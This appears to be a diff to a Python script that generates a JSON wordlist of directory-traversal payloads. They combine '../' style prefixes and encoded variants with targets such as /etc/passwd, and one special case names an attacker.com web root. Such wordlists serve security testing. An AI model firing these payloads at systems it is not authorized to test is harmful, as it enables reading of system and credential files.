@@ -9,11 +9,13 @@ with open("payloads.json","w") as payload_file:
 	#Opening of JSON
 	payload_file.write('[\n');
 
+	#Special Cases
+	payload_file.write('["../../../../../../../../var/www/attacker.com/public_html/", "image.jpg"]\n')
 
 	#Contains the various types of directory pathing
 	#%2f = / || %2e = . || %252f = / || '%255c' = \
 	list_of_postfix_1 = ['/etc','/etc/', '/etc/passwd', '%2fetc%2fpasswd','/etc/passwd%00index.html', '/etc/passwd;index.html','//etc//passwd','L2V0Yy9wYXNzd2Q%3D']
-	list_of_prefix = ['../','..././','./../','.../','..../','...//','....\/','..../\\']
+	list_of_prefix = ['../','..././','./../','.../','..../','...//','....\\/','..../\\\\']
 
 	#Print just the postfix
 	for post_style in list_of_postfix_1:
@@ -255,8 +257,6 @@ with open("payloads.json","w") as payload_file:
 	'''
 
 
-	#Special Cases
-	payload_file.write('["../../../../../../../../var/www/attacker.com/public_html/", "image.jpg"]\n')
 
 	#Closing
 	payload_file.write(']')
